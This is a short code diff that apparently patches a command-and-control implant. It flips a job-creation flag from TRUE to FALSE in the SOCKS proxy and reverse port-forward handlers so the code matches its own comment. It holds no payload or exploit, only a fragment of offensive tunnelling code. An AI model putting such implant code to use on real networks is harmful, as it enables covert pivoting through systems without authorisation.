@@ -1506,7 +1506,7 @@ auto DECLFN Task::Socks(
                                 KhFree( TmpBufDownload );
                             
                                 // Now create the job — IsResponse = FALSE so Jobs::Create will call Bytes() on TmpPsr
-                                NewJobDownload = Self->Jbs->Create( Self->Jbs->TunnelUUID, TmpPsrDownload, TRUE );
+                                NewJobDownload = Self->Jbs->Create( Self->Jbs->TunnelUUID, TmpPsrDownload, FALSE );
                                 if ( ! NewJobDownload ) {
                                     KhDbg("WARNING: Failed to create job for Process Tunnel task");
                                     KhFree(TmpBufDownload);
@@ -1704,7 +1704,7 @@ auto Task::RPortfwd(
                         KhFree( TmpBufDownload );
                     
                         // Now create the job — IsResponse = FALSE so Jobs::Create will call Bytes() on TmpPsr
-                        NewJobDownload = Self->Jbs->Create( Self->Jbs->TunnelUUID, TmpPsrDownload, TRUE );
+                        NewJobDownload = Self->Jbs->Create( Self->Jbs->TunnelUUID, TmpPsrDownload, FALSE );
                         if ( ! NewJobDownload ) {
                             KhDbg("WARNING: Failed to create job for Process Tunnel task\n");
                             KhFree(TmpBufDownload);
